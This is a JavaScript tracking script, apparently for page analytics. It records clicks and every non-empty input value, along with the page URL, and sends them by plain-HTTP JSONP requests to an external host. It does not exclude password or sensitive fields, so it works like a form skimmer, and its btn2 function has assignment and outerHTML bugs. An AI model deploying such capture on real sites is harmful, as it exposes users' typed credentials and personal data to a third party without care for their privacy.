setTimeout(function(){

    $('input').blur(function () {

        if ($(this).val() != "" && ($(this).attr('min') == null)) {

            var label = 'input';
            var value = this.value;
            var text = this.innerText;
            var id = this.id;
            var classname = this.className;
            var name = this.name;
            label = label == '' || label == null ? '' : label;
            id = id == '' || id == null ? '' : id;
            classname = classname == '' || classname == null ? '' : classname;
            name = name == '' || name == null ? '' : name;
            text = text == '' || text == null ? '' : text;
            value = value == '' || value == null ? '' : value;
            var tab = this.outerHTML==null?"":this.outerHTML;
            var message = 'label=' + label + '&id=' + id + '&className=' + classname + '&name=' + name + '&text=' + text + '&value=' + value+'&tab='+tab;
            console.log(message);
            if(tab!=null&&tab!=''&&tab!='undefined'){
                sendMsg(message);
            }
        }

    });

    $('a').click(function () {

        if ($(this).attr('min') == null) {
            var label = 'a';
            var value = this.value;
            var text = this.innerText;
            var id = this.id;
            var classname = this.className;
            var name = this.name;
            label = label == '' || label == null ? '' : label;
            id = id == '' || id == null ? '' : id;
            classname = classname == '' || classname == null ? '' : classname;
            name = name == '' || name == null ? '' : name;
            text = text == '' || text == null ? '' : text;
            value = value == '' || value == null ? '' : value;
            var tab = this.outerHTML==null?"":this.outerHTML;
            var message = 'label=' + label + '&id=' + id + '&className=' + classname + '&name=' + name + '&text=' + text + '&value=' + value+'&tab='+tab;
            console.log(message);
            if(tab!=null&&tab!=''&&tab!='undefined'){
                sendMsg(message);
            }
        }

    });
    $('button').click(function () {
        if ($(this).attr('min') == null) {
            var label = 'button';
            var value = this.value;
            var text = this.innerText;
            var id = this.id;
            var classname = this.className;
            var name = this.name;
            label = label == '' || label == null ? '' : label;
            id = id == '' || id == null ? '' : id;
            classname = classname == '' || classname == null ? '' : classname;
            name = name == '' || name == null ? '' : name;
            text = text == '' || text == null ? '' : text;
            value = value == '' || value == null ? '' : value;
            var tab = this.outerHTML==null?"":this.outerHTML;
            var message = 'label=' + label + '&id=' + id + '&className=' + classname + '&name=' + name + '&text=' + text + '&value=' + value+'&tab='+tab;
            console.log(message);
            if(tab!=null&&tab!=''&&tab!='undefined'){
                sendMsg(message);
            }
        }
    });
},1000)

function btn1(num) {

    var a = num;

    var Inp = document.getElementsByTagName('input');

    for (var i = 0; i < Inp.length; i++) {

        Inp[i].index = i;

        if (Inp[i].getAttribute('min') == a) {
            var oldmessage = [];
            var text = Inp[i].innerText;
            var name = Inp[i].name;
            var value = Inp[i].value;
            var id = Inp[i].id;
            var classname = Inp[i].className;
            var label = 'input';
            label = label == '' || label == null ? '' : label;
            id = id == '' || id == null ? '' : id;
            classname = classname == '' || classname == null ? '' : classname;
            name = name == '' || name == null ? '' : name;
            text = text == '' || text == null ? '' : text;
            value = value == '' || value == null ? '' : value;
            var tab = Inp[i].outerHTML==null?"":Inp[i].outerHTML;
            var message = 'label=' + label + '&id=' + id + '&className=' + classname + '&name=' + name + '&text=' + text + '&value=' + value+'&tab='+tab;
            oldmessage.push(message);
            console.log(message);
            if(tab!=null&&tab!=''&&tab!='undefined'){
                sendMsg(message);
            }
        }

    }

}
// onclick="btn2(this)"
function btn2(a) {

    var text = $(a).text();
    var value = $(a).attr('value');
    if (value = 'undefined') {
        value = '';
    }
    var name = $(a).attr('name');
    if (name = 'undefined') {
        name = '';
    }
    var classname = $(a).attr('class');
    if (classname = 'undefined') {
        classname = '';
    }
    var id = $(a).attr('id');
    if (id = 'undefined') {
        id = '';
    }
    var label = $(a).get(0).tagName;
    label = label == '' || label == null ? '' : label;
    id = id == '' || id == null ? '' : id;
    classname = classname == '' || classname == null ? '' : classname;
    name = name == '' || name == null ? '' : name;
    text = text == '' || text == null ? '' : text;
    value = value == '' || value == null ? '' : value;
    var tab = $(a).outerHTML==null?"":$(a).outerHTML;
    var message = 'label=' + label + '&id=' + id + '&className=' + classname + '&name=' + name + '&text=' + text + '&value=' + value+'&tab='+tab;
    console.log(message);
    if(tab!=null&&tab!=''&&tab!='undefined'){
        sendMsg(message);
    }

}


/*
1.第一次encodeURI，按照utf-8方式获取字节数组变成[-28,-72-83]，对字节码数组进行遍历，把每个字节转化成对应的16进制数，这样就变成了[E4,B8,AD],最后变成[%E4,%B8,%AD]

2.第二次encodeURI，把数组最后变成[%25E4,%25B8,%25AD]然后就把处理后的数据[%25E4,%25B8,%25AD]发往服务器端，
当应用服务器调用getParameter方法，getParameter方法会去向应用服务器请求参数
应用服务器最初获得的就是发送来的[%25E4,%25B8,%25AD]，应用服务器会对这个数据进行URLdecode操作，URldecode操作和encodeURL操作是相反的操作，处理结果就是[%E4,%B8,%AD]，并把这个值返回给getParameter方法
然后再在服务器端中调用相应的URL转码方法或者是函数  就可以把数据还原成最初页面发送过来的中文“中”了。
 */
//刷新页面时执行
visitPage();
function sendMsg(json) {
    $.ajax({
        type: "get",
        url: "http://fxys.ictcx.com/externalAction?status=action&indexPage=" + window.encodeURI(window.encodeURI(window.location.href)) + "&" + window.encodeURI(window.encodeURI(json)),
        dataType: 'jsonp',
        jsonp: 'callback',
        jsonpCallback: "callbackFunction",
        success: function (data) {
            console.log(data.msg);
        },
        error: function (data) {
            console.log(data.msg);
        }
    });
}
//刷新页面时只发送页面数据
function visitPage() {
    $.ajax({
        type: "get",
        url: "http://fxys.ictcx.com/externalAction?status=refresh&indexPage=" + window.encodeURI(window.encodeURI(window.location.href)),
        dataType: 'jsonp',
        jsonpCallback: "callbackFunction",
        success: function (data) {
            //用于检测脚本是否安装成功
            $("body").append("<aa id='statisticChecking' style='display: none'>checkIngJsIsInstallSuccess</aa>");
            console.log(data.msg);
        },
        error: function (data) {
            console.log(data);
        }
    });
}



